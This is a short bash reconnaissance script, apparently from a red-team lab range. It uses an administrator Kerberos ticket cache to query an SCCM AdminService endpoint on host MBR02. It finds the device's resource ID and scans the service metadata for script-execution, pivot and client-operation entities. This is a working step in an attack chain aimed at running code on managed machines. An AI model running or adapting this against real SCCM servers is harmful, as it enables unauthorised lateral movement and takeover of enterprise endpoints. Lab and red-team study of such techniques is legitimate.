#!/bin/bash
# WT037/039 recon: AdminService surface + MBR02 ResourceID (run ON provisioning)
CC=/tmp/administrator@HTTP_mbr02.range.local@RANGE.LOCAL.ccache
echo '=== 1. AdminService SMS_R_System filter Name=MBR02 ==='
KRB5CCNAME=$CC curl -k -s --negotiate -u : --max-time 30 "https://mbr02.range.local/AdminService/wmi/SMS_R_System?\$filter=Name%20eq%20%27MBR02%27" 2>&1 | head -c 2500
echo
echo '=== 2. wmi metadata: interesting entities ==='
KRB5CCNAME=$CC curl -k -s --negotiate -u : --max-time 40 "https://mbr02.range.local/AdminService/wmi/\$metadata" -o /tmp/wmi_metadata.xml 2>&1
echo "bytes: $(wc -c < /tmp/wmi_metadata.xml)"
grep -oE 'Name="SMS_[A-Za-z0-9_]+"' /tmp/wmi_metadata.xml | sort -u | grep -iE 'pivot|script|clientoperation|advert|assignment|collection' 
echo '=== 3. v1.0 metadata: operation/pivot entities ==='
KRB5CCNAME=$CC curl -k -s --negotiate -u : --max-time 40 "https://mbr02.range.local/AdminService/v1.0/\$metadata" -o /tmp/v1_metadata.xml 2>&1
echo "bytes: $(wc -c < /tmp/v1_metadata.xml)"
grep -oE 'Name="[A-Za-z0-9_.]+"' /tmp/v1_metadata.xml | sort -u | grep -iE 'pivot|operation|script'
echo '=== 4. SMS_ClientOperation via wmi (fallback path exists?) ==='
grep -oE 'Name="SMS_ClientOperation"' /tmp/wmi_metadata.xml | head -1
echo 'RECON_DONE'
